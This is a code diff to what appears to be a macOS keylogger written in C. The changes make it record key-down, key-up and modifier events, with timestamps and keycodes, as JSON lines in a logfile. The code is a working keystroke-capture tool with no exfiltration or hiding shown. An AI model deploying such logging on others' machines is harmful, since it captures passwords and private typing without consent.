@@ -60,24 +60,44 @@ int main(int argc, const char *argv[]) {
 
 // The following callback method is invoked on every keypress.
 CGEventRef CGEventCallback(CGEventTapProxy proxy, CGEventType type, CGEventRef event, void *refcon) {
-    if (type != kCGEventKeyDown && type != kCGEventFlagsChanged) {
-        return event;
-    }
+    if (type != kCGEventKeyDown && type != kCGEventFlagsChanged && type != kCGEventKeyUp) { return event; }
 
     // Retrieve the incoming keycode.
     CGKeyCode keyCode = (CGKeyCode) CGEventGetIntegerValueField(event, kCGKeyboardEventKeycode);
 
     if (keyCode == leftShift || keyCode == rightShift || keyCode == capsLock) {
         keyCodeCache[keyCode] = keyCodeCache[keyCode] == 1 ? 0 : 1;
-        return event;
+        // return event;
     }
+
+    struct timespec time;
+    clock_gettime(CLOCK_REALTIME, &time);
+
+    printf("%lld.%.9ld", (long long)time.tv_sec, time.tv_nsec);
+
+    time_t rawtime = time.tv_sec;
+    struct tm  ts;
+    char       timestamp[80];
+    char       milliseconds[80];
+
+    ts = *localtime(&rawtime);
+    strftime(timestamp, sizeof(timestamp), "%Y-%m-%dT%H:%M:%S.", &ts);
 
     // Print the human readable key to the logfile.
     bool shift = keyCodeCache[rightShift] + keyCodeCache[leftShift] > 0;
     bool caps = keyCodeCache[capsLock] == 1;
-    fprintf(logfile, "%s", convertKeyCode(keyCode, shift, caps));
+    fprintf(logfile, "{\"timestamp\": \"%s%.9ld\", \"key\": \"%s\", \"code\": \"%hu\", \"type\": \"%s\"}\n", timestamp, time.tv_nsec, convertKeyCode(keyCode, shift, caps), keyCode, convertType(type));
     fflush(logfile);
     return event;
+}
+
+const char *convertType(CGEventType type) {
+    switch ((CGEventType) type) {
+        case kCGEventKeyDown: return "down";
+        case kCGEventKeyUp: return "up";
+        case kCGEventFlagsChanged: return "changed";
+    }
+    return "unknown";
 }
 
 // The following method converts the key code returned by each keypress as
@@ -151,11 +171,11 @@ const char *convertKeyCode(int keyCode, bool shift, bool caps) {
         case 92:  return "9";
         case 36:  return "[return]";
         case 48:  return "[tab]";
-        case 49:  return " ";
+        case 49:  return "[space]";
         case 51:  return "[del]";
         case 53:  return "[esc]";
-        case 54:  return "[right-cmd]";
-        case 55:  return "[left-cmd]";
+        case 54:  return "[left-cmd]";
+        case 55:  return "[right-cmd]";
         case 56:  return "[left-shift]";
         case 57:  return "[caps]";
         case 58:  return "[left-option]";
